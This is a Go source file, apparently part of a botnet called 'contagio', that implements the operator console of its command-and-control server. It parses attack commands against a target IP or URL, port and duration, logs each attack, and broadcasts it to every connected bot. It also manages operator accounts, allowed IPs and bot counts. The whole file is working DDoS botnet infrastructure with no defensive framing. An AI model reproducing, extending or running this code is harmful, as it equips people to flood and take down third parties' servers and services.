package cnc

import (
	"bufio"
	"bytes"
	"contagio/contagio/bot_server"
	"contagio/contagio/cnc/database"
	"fmt"
	"net"
	"net/textproto"
	"strconv"
	"strings"
)

func (c *Connection) CommandHandler() error {

	defer Catch()

	_, err := c.conn.Write([]byte(c.GenerateCmdPrompt(c.config.Cnc.CmdPrompt)))
	if err != nil {
		c.conn.Close()
		return err
	}

	reader := bufio.NewReader(c.conn)
	tp := textproto.NewReader(reader)
	_command, err := tp.ReadLine()

	if err != nil {
		c.conn.Close()
		return err
	}

	command := []byte(_command)

	if bytes.EqualFold(command, []byte{255, 244, 255, 253, 6}) { // ctrl +c
		c.conn.Close()
		return nil
	}

	if bytes.HasPrefix(command, []byte{101, 120, 105, 116}) || bytes.HasPrefix(command, []byte{113, 117, 105, 116}) { // exit /quit
		c.conn.Close()
		return nil
	}

	if bytes.HasPrefix(command, []byte{99, 108, 115}) || bytes.HasPrefix(command, []byte{99, 108, 101, 97, 114}) {
		c.CncMainMenu()
		return nil
	}

	if bytes.HasPrefix(command, []byte{104, 101, 108, 112}) || bytes.HasPrefix(command, []byte{63}) {
		c.Help()
		return nil
	}

	if !bytes.HasPrefix(command, []byte{33}) {

		for _, i := range CmdList {
			if bytes.HasPrefix(command, i.Uint8) {
				i.function(_command, c)
				return nil
			}
		}
		c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.UnknownCommandError)))
		return nil
	} else {
		for _, i := range MethodsList {
			if bytes.HasPrefix(command, i.Uint8) {
				err := c.isSyntaxError(_command, i)
				if err {
					c.conn.Write([]byte(c.correctSyntax(_command, i)))
					return nil
				}

				cmd := strings.Split(_command, " ")
				l := c.NewLog(ATTACK_STARTED, cmd[1], strings.TrimPrefix(cmd[0], "!"), cmd[3], cmd[2])
				go l.SendLog()

				go bot_server.SendCommand(_command)
				bc := bot_server.BotCount
				botsc := strings.ReplaceAll(c.config.Cnc.CommandSent, "{bots}", strconv.Itoa(bc))
				c.conn.Write([]byte(GeneratePrompt(botsc)))
				return nil

			}

		}

	}

	c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.UnknownCommandError)))
	return nil
}

func (c *Connection) isSyntaxError(command string, cmdinfo MethodsInfo) bool {

	defer Catch()
	cmd := strings.Split(command, " ")

	if len(cmd) != 4 {
		return true
	}

	if cmdinfo.Layer == 4 {

		ip := strings.Split(cmd[1], ".")

		if len(ip) != 4 {
			return true
		}

		for _, _oct := range ip {
			oct, err := strconv.Atoi(_oct)
			if err != nil || oct > 255 || oct < 0 {
				return true
			}
		}

		err := net.ParseIP(cmd[1])
		if err == nil {
			return true
		}

	} else {
		if !strings.HasPrefix(cmd[1], "https://") && !strings.HasPrefix(cmd[1], "http://") {
			return true
		}
	}

	return false

}

func (c *Connection) correctSyntax(command string, cmdinfo MethodsInfo) string {

	defer Catch()

	var synt, syntexample string
	var res = c.config.Cnc.InvalidCommandSyntaxError

	args := strings.Split(command, " ")

	if cmdinfo.Layer == 7 {
		synt = fmt.Sprintf("%s <TARGET> <PORT> <TIME>", args[0])
		syntexample = fmt.Sprintf("%s https://example.com 443 60", args[0])
	} else { // layer 4
		synt = fmt.Sprintf("%s <TARGET> <PORT> <TIME>", args[0])
		syntexample = fmt.Sprintf("%s 1.1.1.1 22 60", args[0])
	}

	res = strings.ReplaceAll(res, "{syntax}", synt)
	res = strings.ReplaceAll(res, "{example}", syntexample)

	return GeneratePrompt(res)

}

func Adduser(command string, c *Connection) {

	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = GeneratePrompt(c.config.Cnc.CommandExecuted)

	if c.login != c.config.RootLogin {
		return
	}

	cmd := strings.Split(command, " ")

	if len(cmd) < 3 {
		res = strings.ReplaceAll(res, "{syntax}", "adduser <LOGIN> <PASSWORD>")
		res = strings.ReplaceAll(res, "{example}", "adduser user pass")

		c.conn.Write([]byte(GeneratePrompt(res)))
		return
	}

	database.AddUser(cmd[1], cmd[2])
	c.conn.Write([]byte(suc))

}

func Bots(command string, c *Connection) {

	defer Catch()

	if c.login != c.config.RootLogin {
		return
	}

	tot, bc := bot_server.GetBots()

	if bc == "" {
		c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.NoBotsConnectedError)))
		return
	}

	botsc := strings.ReplaceAll(c.config.Cnc.BotCount, "{bots}", bc)
	botsc = strings.ReplaceAll(botsc, "{total}", strconv.Itoa(tot))

	c.conn.Write([]byte(GeneratePrompt(botsc)))
}

func RemoveUser(command string, c *Connection) {
	// admin perms
	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = GeneratePrompt(c.config.Cnc.CommandExecuted)

	if c.login != c.config.RootLogin {
		return
	}

	cmd := strings.Split(command, " ")

	if len(cmd) < 2 {
		res = strings.ReplaceAll(res, "{syntax}", "removeuser <LOGIN>")
		res = strings.ReplaceAll(res, "{example}", "removeuser user")

		c.conn.Write([]byte(GeneratePrompt(res)))
		return
	}

	database.RemoveUser(cmd[1])
	c.conn.Write([]byte(suc))

}

func AddIp(command string, c *Connection) {
	// admin perms

	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = GeneratePrompt(c.config.Cnc.CommandExecuted)

	if c.login != c.config.RootLogin {
		return
	}

	cmd := strings.Split(command, " ")

	if len(cmd) < 2 {
		res = strings.ReplaceAll(res, "{syntax}", "addip <IP>")
		res = strings.ReplaceAll(res, "{example}", "addip 127.0.0.1")

		c.conn.Write([]byte(GeneratePrompt(res)))
		return
	}

	database.AddIp(cmd[1])
	c.conn.Write([]byte(suc))

}

func RemoveIp(command string, c *Connection) {

	// admin perms

	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = GeneratePrompt(c.config.Cnc.CommandExecuted)

	if c.login != c.config.RootLogin {
		return
	}

	cmd := strings.Split(command, " ")

	if len(cmd) < 2 {
		res = strings.ReplaceAll(res, "{syntax}", "removeip <IP>")
		res = strings.ReplaceAll(res, "{example}", "removeip 127.0.0.1")

		c.conn.Write([]byte(GeneratePrompt(res)))
		return
	}

	database.RemoveIp(cmd[1])
	c.conn.Write([]byte(suc))

}

func Methods(command string, c *Connection) {
	defer Catch()

	if c.config.Cnc.CustomMethodsEnabled {
		for _, i := range c.config.Cnc.CustomMethods {
			c.conn.Write([]byte(GeneratePrompt(i)))
		}
		return
	}

	methods := c.config.Cnc.MethodsCommand

	var temp string
	var f = make([]string, 0)
	var a = make([]string, 0)
	var res = make([]string, 0)

	for range MethodsList {
		temp += methods + "\n"
	}

	for x, i := range strings.Split(temp, "\n") {
		a = append(a, strings.Replace(i, "{name}", MethodsList[x].Name, 1))
	}

	for x, i := range a {
		f = append(f, strings.Replace(i, "{description}", MethodsList[x].Description, 1))
	}

	for x, i := range f {
		res = append(res, strings.Replace(i, "{layer}", strconv.Itoa(MethodsList[x].Layer), 1))
	}

	c.conn.Write(bytes.TrimSuffix([]byte(GeneratePrompt(strings.Join(res, "\n\r"))), []byte{0xA, 0xD}))
}

func (c *Connection) Help() {
	defer Catch()

	if c.config.Cnc.CustomHelpEnabled {
		for _, i := range c.config.Cnc.CustomHelp {
			c.conn.Write([]byte(GeneratePrompt(i)))
		}
		return
	}

	help := c.config.Cnc.HelpCommand

	var temp string
	var f = make([]string, 0)
	var res = make([]string, 0)

	for range CmdList {
		temp += help + "\n"
	}

	for x, i := range strings.Split(temp, "\n") {
		f = append(f, strings.Replace(i, "{command}", CmdList[x].Name, 1))
	}

	for x, i := range f {
		res = append(res, strings.Replace(i, "{description}", CmdList[x].Description, 1))

	}

	c.conn.Write(bytes.TrimSuffix([]byte(GeneratePrompt(strings.Join(res, "\n\r"))), []byte{0xA, 0xD}))
}
